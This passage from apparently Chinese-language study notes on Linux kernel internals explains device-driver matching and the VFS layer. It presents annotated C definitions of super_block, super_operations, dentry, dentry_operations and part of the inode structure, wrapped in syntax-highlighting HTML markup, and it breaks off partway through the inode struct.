operator">=</span> data<span class="token punctuation">;</span><span class="token keyword">int</span> ret<span class="token punctuation">;</span>ret <span class="token operator">=</span> <span class="token function">driver_match_device</span><span class="token punctuation">(</span>drv<span class="token punctuation">,</span> dev<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dev<span class="token operator">-&gt;</span>driver<span class="token punctuation">)</span><span class="token function">driver_probe_device</span><span class="token punctuation">(</span>drv<span class="token punctuation">,</span> dev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//driver_probe_device -&gt; really_probe -&gt; drv-&gt;probe(dev);//调用驱动的probe</span><span class="token function">device_unlock</span><span class="token punctuation">(</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>dev<span class="token operator">-&gt;</span>parent<span class="token punctuation">)</span><span class="token function">device_unlock</span><span class="token punctuation">(</span>dev<span class="token operator">-&gt;</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">int</span> <span class="token function">driver_match_device</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device_driver</span> <span class="token operator">*</span>drv<span class="token punctuation">,</span>      <span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> drv<span class="token operator">-&gt;</span>bus<span class="token operator">-&gt;</span>match <span class="token operator">?</span> drv<span class="token operator">-&gt;</span>bus<span class="token operator">-&gt;</span><span class="token function">match</span><span class="token punctuation">(</span>dev<span class="token punctuation">,</span> drv<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//bus上定义的match函数</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">platform_match</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">device_driver</span> <span class="token operator">*</span>drv<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">struct</span> <span class="token class-name">platform_device</span> <span class="token operator">*</span>pdev <span class="token operator">=</span> <span class="token function">to_platform_device</span><span class="token punctuation">(</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">platform_driver</span> <span class="token operator">*</span>pdrv <span class="token operator">=</span> <span class="token function">to_platform_driver</span><span class="token punctuation">(</span>drv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">/* fall-back to driver name match */</span><span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>pdev<span class="token operator">-&gt;</span>name<span class="token punctuation">,</span> drv<span class="token operator">-&gt;</span>name<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="08-文件管理">08 | 文件管理</h2><h3 id="文件系统">文件系统</h3><p>文件系统解决的就是如何把许多文件储存在某一种储存设备上，方便进程对各种文件执行打开、关闭、读写、增加和删除等操作。因为这些操作实际上非常复杂，所以操作系统中分出一个子系统专门处理这些问题，这个系统就叫<strong>文件系统</strong>。</p><p>文件系统的核心现在我们还没法直观地感受到，但是它在上层为用户或者进程提供了一个逻辑视图，也就是目录结构。</p><p>下图中就是典型的文件系统逻辑视图，从/（根）目录开始，就能找到每个文件、每个目录和每个目录下的所有文件。我们可以看出目录也是文件的一部分，它也扮演了“组织仓库管理员”的角色，可以对文件进行分层分类，以便用户对众多文件进行管理。</p><h3 id="VFS">VFS</h3><ul><li><p>VFS（Virtual Filesystem）可以理解为通用文件系统抽象层，让不同的文件系统表现出一致的行为，VFS向上对应用提供了操作文件的标准接口，向下规范了一个文件系统要接入VFS必需要实现的机制</p></li><li><p>VFS提供一系列数据结构和具体文件系统应该实现的回调函数，这样，一个文件系统就可以被安装到VFS中</p></li></ul><h4 id="数据结构-3">数据结构</h4><ul><li><p>VFS 为了屏蔽各个文件系统的差异，就必须要定义一组通用的数据结构，规范各个文件系统的实现，每种结构都对应一套回调函数集合，这是典型的<strong>面向对象的设计方法</strong></p></li><li><p>这些数据结构包含描述文件系统信息的超级块、表示文件名称的目录结构、描述文件自身信息的索引节点结构、表示一个打开文件的实例结构</p></li></ul><h5 id="超级块结构">超级块结构</h5><ul><li><p>这个结构用于一个<strong>具体文件系统的相关信息</strong>，其中包含了 VFS 规定的标准信息，也有具体文件系统的特有信息</p></li><li><p>Linux 中的超级块结构是一个文件系统安装在 VFS 中的标识</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">super_block</span> <span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span>    s_list<span class="token punctuation">;</span> <span class="token comment">//超级块链表</span>    dev_t           s_dev<span class="token punctuation">;</span>     <span class="token comment">//设备标识</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span>       s_blocksize_bits<span class="token punctuation">;</span><span class="token comment">//以位为单位的块大小</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span>       s_blocksize<span class="token punctuation">;</span><span class="token comment">//以字节为单位的块大小</span>    loff_t          s_maxbytes<span class="token punctuation">;</span> <span class="token comment">//一个文件最大多少字节</span>    <span class="token keyword">struct</span> <span class="token class-name">file_system_type</span> <span class="token operator">*</span>s_type<span class="token punctuation">;</span> <span class="token comment">//文件系统类型</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">super_operations</span>   <span class="token operator">*</span>s_op<span class="token punctuation">;</span><span class="token comment">//超级块函数集合</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">dquot_operations</span>   <span class="token operator">*</span>dq_op<span class="token punctuation">;</span><span class="token comment">//磁盘限额函数集合</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span>       s_flags<span class="token punctuation">;</span><span class="token comment">//挂载标志</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span>       s_magic<span class="token punctuation">;</span><span class="token comment">//文件系统魔数</span>    <span class="token keyword">struct</span> <span class="token class-name">dentry</span>       <span class="token operator">*</span>s_root<span class="token punctuation">;</span><span class="token comment">//挂载目录</span>    <span class="token keyword">struct</span> <span class="token class-name">rw_semaphore</span> s_umount<span class="token punctuation">;</span><span class="token comment">//卸载信号量</span>    <span class="token keyword">int</span>         s_count<span class="token punctuation">;</span><span class="token comment">//引用计数</span>    atomic_t        s_active<span class="token punctuation">;</span><span class="token comment">//活动计数</span>    <span class="token keyword">struct</span> <span class="token class-name">block_device</span> <span class="token operator">*</span>s_bdev<span class="token punctuation">;</span><span class="token comment">//块设备</span>    <span class="token keyword">void</span>            <span class="token operator">*</span>s_fs_info<span class="token punctuation">;</span><span class="token comment">//文件系统信息</span>    time64_t           s_time_min<span class="token punctuation">;</span><span class="token comment">//最小时间限制</span>    time64_t           s_time_max<span class="token punctuation">;</span><span class="token comment">//最大时间限制</span>    <span class="token keyword">char</span>            s_id<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">//标识名称</span>    uuid_t          s_uuid<span class="token punctuation">;</span>     <span class="token comment">//文件系统的UUID</span>    <span class="token keyword">struct</span> <span class="token class-name">list_lru</span>     s_dentry_lru<span class="token punctuation">;</span><span class="token comment">//LRU方式挂载的目录 </span>    <span class="token keyword">struct</span> <span class="token class-name">list_lru</span>     s_inode_lru<span class="token punctuation">;</span><span class="token comment">//LRU方式挂载的索引结点</span>    <span class="token keyword">struct</span> <span class="token class-name">mutex</span>        s_sync_lock<span class="token punctuation">;</span><span class="token comment">//同步锁  </span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span>    s_inodes<span class="token punctuation">;</span>   <span class="token comment">//所有的索引节点</span>    spinlock_t      s_inode_wblist_lock<span class="token punctuation">;</span><span class="token comment">//回写索引节点的锁</span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span>    s_inodes_wb<span class="token punctuation">;</span>    <span class="token comment">//挂载所有要回写的索引节点</span><span class="token punctuation">}</span> __randomize_layout<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在挂载文件系统时 VFS 会调用获取文件系统超级块的函数，用具体文件系统的信息构造一个上述结构的实例，有了这个实例 VFS 就能感知到文件系统了</p></li><li><p>超级块函数集合结构，结构中所有函数指针所指向的函数都应该要由一个具体文件系统实现</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">super_operations</span> <span class="token punctuation">{</span>    <span class="token comment">//分配一个新的索引结点结构</span>    <span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span>alloc_inode<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">super_block</span> <span class="token operator">*</span>sb<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//销毁给定的索引节点</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>destroy_inode<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//释放给定的索引节点</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>free_inode<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//VFS在索引节点为脏(改变)时，会调用此函数</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>dirty_inode<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//该函数用于将给定的索引节点写入磁盘</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>write_inode<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">writeback_control</span> <span class="token operator">*</span>wbc<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//在最后一个指向索引节点的引用被释放后，VFS会调用该函数</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>drop_inode<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>evict_inode<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//减少超级块计数调用</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>put_super<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">super_block</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//同步文件系统调用</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>sync_fs<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">super_block</span> <span class="token operator">*</span>sb<span class="token punctuation">,</span> <span class="token keyword">int</span> wait<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//释放超级块调用</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>freeze_super<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">super_block</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//释放文件系统调用</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>freeze_fs<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">super_block</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>thaw_super<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">super_block</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>unfreeze_fs<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">super_block</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//VFS通过调用该函数，获取文件系统状态</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>statfs<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">kstatfs</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//当指定新的安装选项重新安装文件系统时，VFS会调用此函数</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>remount_fs<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">super_block</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//VFS调用该函数中断安装操作。该函数被网络文件系统使用，如NFS</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>umount_begin<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">super_block</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>有了超级块和超级块函数集合结构 VFS 就能让一个文件系统的信息和表示变得规范了，也就是说，文件系统只要实现了 super_block 和 super_operations 两个结构就可以插入到 VFS</p></li></ul><h5 id="目录结构">目录结构</h5><ul><li><p>Linux 中所有文件都是用目录组织的，包括具体的文件系统也是挂载到某个目录下</p></li><li><p>VFS 用 <code>struct dentry</code> 来表示一个目录，dentry 结构中包含了目录名称和挂载子目录的链表，同时也能指向父目录，需要注意：目录也是文件，需要用 inode 索引结构来管理目录文件数据</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> d_flags<span class="token punctuation">;</span>       <span class="token comment">//目录标志</span>    seqcount_spinlock_t d_seq<span class="token punctuation">;</span>  <span class="token comment">//锁</span>    <span class="token keyword">struct</span> <span class="token class-name">hlist_bl_node</span> d_hash<span class="token punctuation">;</span><span class="token comment">//目录的哈希链表    </span>    <span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span>d_parent<span class="token punctuation">;</span>    <span class="token comment">//指向父目录</span>    <span class="token keyword">struct</span> <span class="token class-name">qstr</span> d_name<span class="token punctuation">;</span>         <span class="token comment">//目录名称</span>    <span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>d_inode<span class="token punctuation">;</span>      <span class="token comment">//指向目录文件的索引节点 </span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> d_iname<span class="token punctuation">[</span>DNAME_INLINE_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//短目录名</span>    <span class="token keyword">struct</span> <span class="token class-name">lockref</span> d_lockref<span class="token punctuation">;</span>   <span class="token comment">//目录锁与计数</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">dentry_operations</span> <span class="token operator">*</span>d_op<span class="token punctuation">;</span><span class="token comment">//目录的函数集</span>    <span class="token keyword">struct</span> <span class="token class-name">super_block</span> <span class="token operator">*</span>d_sb<span class="token punctuation">;</span>   <span class="token comment">//指向超级块</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> d_time<span class="token punctuation">;</span>       <span class="token comment">//时间</span>    <span class="token keyword">void</span> <span class="token operator">*</span>d_fsdata<span class="token punctuation">;</span>         <span class="token comment">//指向具体文件系统的数据</span>    <span class="token keyword">union</span> <span class="token punctuation">{</span>        <span class="token keyword">struct</span> <span class="token class-name">list_head</span> d_lru<span class="token punctuation">;</span>     <span class="token comment">//LRU链表</span>        wait_queue_head_t <span class="token operator">*</span>d_wait<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span> d_child<span class="token punctuation">;</span>   <span class="token comment">//挂入父目录的链表节点 </span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span> d_subdirs<span class="token punctuation">;</span> <span class="token comment">//挂载所有子目录的链表</span><span class="token punctuation">}</span> __randomize_layout<span class="token punctuation">;</span><span class="token comment">//快速字符串保存关于字符串的 "元数据"（即长度和哈希值）</span><span class="token keyword">struct</span> <span class="token class-name">qstr</span> <span class="token punctuation">{</span>    <span class="token keyword">union</span> <span class="token punctuation">{</span>        <span class="token keyword">struct</span> <span class="token punctuation">{</span>            HASH_LEN_DECLARE<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        u64 hash_len<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span><span class="token comment">//指向名称字符串</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>目录函数集，结构中的函数也需要具体文件系统实现，查找或者操作目录时 VFS 就会调用这些函数让具体文件系统根据自己储存设备上的目录信息处理并设置 dentry 结构中的信息，使文件系统中的目录和 VFS 的目录对应</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">dentry_operations</span> <span class="token punctuation">{</span>    <span class="token comment">//该函数判断目录对象是否有效</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>d_revalidate<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>d_weak_revalidate<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//该函数为目录项生成散列值，当目录项要加入散列表中时，VFS调用该函数</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>d_hash<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">qstr</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//VFS调用该函数来比较name1和name2两个文件名。多数文件系统使用VFS的默认操作，仅做字符串比较。对于有些文件系统，比如FAT，简单的字符串比较不能满足其需要，因为 FAT文件系统不区分大小写</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>d_compare<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span>            <span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">qstr</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//当目录项对象的计数值等于0时，VFS调用该函数</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>d_delete<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//当分配目录时调用 </span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>d_init<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//当目录项对象要被释放时，VFS调用该函数，默认情况下，它什么也不做</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>d_release<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>d_prune<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//当一个目录项对象丢失了相关索引节点时，VFS调用该函数。默认情况下VFS会调用iput()函数释放索引节点</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>d_iput<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//当需要生成一个dentry的路径名时被调用</span>    <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span>d_dname<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//当要遍历一个自动挂载时被调用（可选），这应该创建一个新的VFS挂载记录并将该记录返回给调用者</span>    <span class="token keyword">struct</span> <span class="token class-name">vfsmount</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span>d_automount<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">path</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//文件系统管理从dentry的过渡（可选）时，被调用</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>d_manage<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">path</span> <span class="token operator">*</span><span class="token punctuation">,</span> bool<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//叠加/联合类型的文件系统实现此方法</span>    <span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span>d_real<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> ____cacheline_aligned<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h5 id="文件索引结点">文件索引结点</h5><ul><li><p>VFS 用 inode 结构表示一个文件索引结点，它里面包含文件权限、文件所属用户、文件访问和修改时间、文件数据块号等一个文件的全部信息，<strong>一个 inode 结构就对应一个文件</strong>，但这个 inode 结构与某个具体文件系统上的 <em>“inode”</em> 结构并不是一一对应关系</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token punctuation">{</span>    umode_t         i_mode<span class="token punctuation">;</span><span class="token comment">//文件访问权限</span>    <span class="token keyword">unsigned</span> <span class="token keyword">short</span>      i_opflags<span class="token punctuation">;</span><span class="token comment">//打开文件时的标志</span>    kuid_t          i_uid<span class="token punctuation">;</span><span class="token comment">//文件所属的用户id</span>    kgid_t          i_gid<span class="token punctuation">;</span><span class="token comment">//文件所属的用户组id</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span>        i_flags<span class="token punctuation">;</span><span class="token comment">//标志</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">inode_operations</span>   <span class="token operator">*</span>i_op<span class="token punctuation">;</span><span class="token comment">//inode函数集</span>    <span class="token keyword">struct</span> <span class="token class-name">super_block</span>  <span class="token operator">*</span>i_sb<span class="token punctuation">;</span><span class="token comment">//指向所属超级块</span>    <span class="token keyword">struct</span> <span class="token class-name">address_space</span>    <span class="token operator">*</span>i_mapping<span class="token punctuation">;</span><span class="token comment">//文件数据在内存中的页缓存</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span>       i_ino<span class="token punctuation">;</span><span class="token comment">//inode号</span>    dev_t           i_rdev<span class="token punctuation">;</span><span class="token comment">//实际设备标志符</span>    loff_t          i_size<span class="token punctuation">;</span><span class="token comment">//文件大小，以字节为单位</span>    <span class="token keyword">struct</span> <span class="token class-name">timespec64</span>   i_atime<span class="token punctuation">;</span><span class="token comment">//文件访问时间</span>    <span class="token keyword">struct</span> <span class="token class-name">timespec64</span>   i_mtime<span class="token punctuation">;</span><span class="token comment">//文件修改时间</span>    <span class="token keyword">struct</span> <span class="token class-name">timespec64</span>   i_ctime<span class="token punctuation">;</span><span class="token comment">//最后修改时间</span>    spinlock_t      i_lock<span class="token punctuation">;</span> <span class="token comment">//保护inode的自旋锁</span>    <span class="token keyword">unsigned</span> <span class="token keyword">short</span>          i_bytes<span class="token punctuation">;</span><span class="token comment">//使用的字节数</span>    u8          i_blkbits<span class="token punctuation">;</span><span class="token comment">//以位为单位的块大小；</span>    u8          i_write_hint<span class="token punctuation">;</span>    blkcnt_t        i_blocks<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span>    i_io_list<span class="token punctuation">;</span>      <span class="token keyword">struct</span> <span class="token class-name">list_head</span>    i_lru<span class="token punctuation">;</span>      <span class="token comment">//在缓存LRU中的链表节点</span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span>    i_sb_list<span class="token punctuation">;</span><span class="token comment">//在超级块中中的链表节点</span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span>    i_wb_list<span class="token punctuation">;</span>    atomic64_t      i_version<span class="token punctuation">;</span><span class="token comment">//版本号</span>    atomic64_t      i_sequence<span class="token punctuation">;</span>     atomic_t        i_count<span class="token punctuation">;</span><span class="token comment">//计数</span>    atomic_t        i_dio_count<span class="token 